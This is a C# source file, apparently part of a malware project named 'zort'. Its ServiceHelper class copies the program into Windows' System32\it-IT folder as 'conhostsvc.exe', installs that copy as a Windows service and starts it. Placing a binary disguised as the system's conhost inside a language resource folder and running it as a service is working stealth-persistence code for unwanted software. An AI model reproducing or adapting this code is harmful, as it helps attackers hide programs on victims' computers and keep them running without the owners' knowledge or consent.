using System;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Messaging;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public static class ServiceHelper
    {
        public static ServiceController GetService()
        {
            return ServiceController.GetServices().FirstOrDefault(s => s.ServiceName.ToLower() == Program.SERVICE_NAME);
        }

        public static string GetItITPath()
        {
            string system32Path = Environment.GetFolderPath(Environment.SpecialFolder.System);
            string itITPath = Path.Combine(system32Path, "it-IT");
            return itITPath;
        }

        public static string CreateItITClone()
        {
            string itITPath = GetItITPath();
            if (!Directory.Exists(itITPath))
            {
                Directory.CreateDirectory(itITPath);
            }
            string clonePath = Path.Combine(itITPath, "conhostsvc.exe");
            if (!File.Exists(clonePath))
            {
                PersistenceHelper.Clone.Create(clonePath);
            }

            return clonePath;
        }

        public static bool IsServiceInstalled()
        {
            return (GetService() != null);
        }

        public static void InstallService(string path) {
            ManagedInstallerClass.InstallHelper(new string[] { path });
        }

        public static bool IsServiceRunning()
        {
            var service = GetService();
            if (service == null) return false;
            return service.Status == ServiceControllerStatus.Running;
        }

        public static bool AmIService()
        {
            var service = GetService();
            if (service == null) return false;

            using (var currentProcess = Process.GetCurrentProcess())
            {
                return service.ServiceHandle.DangerousGetHandle() == currentProcess.Handle &&
                       currentProcess.ProcessName.Equals(Program.SERVICE_NAME, StringComparison.OrdinalIgnoreCase);
            }
        }

        public static void StartService()
        {
            var service = GetService();
            if (service == null) throw new InvalidOperationException("Service not found.");
            if (service.Status != ServiceControllerStatus.Running)
            {
                service.Start();
                service.WaitForStatus(ServiceControllerStatus.Running, new TimeSpan(0, 0, 5));
                if (service.Status != ServiceControllerStatus.Running)
                {
                    throw new InvalidOperationException("Service failed to start.");
                }
            }
        }
    }
}
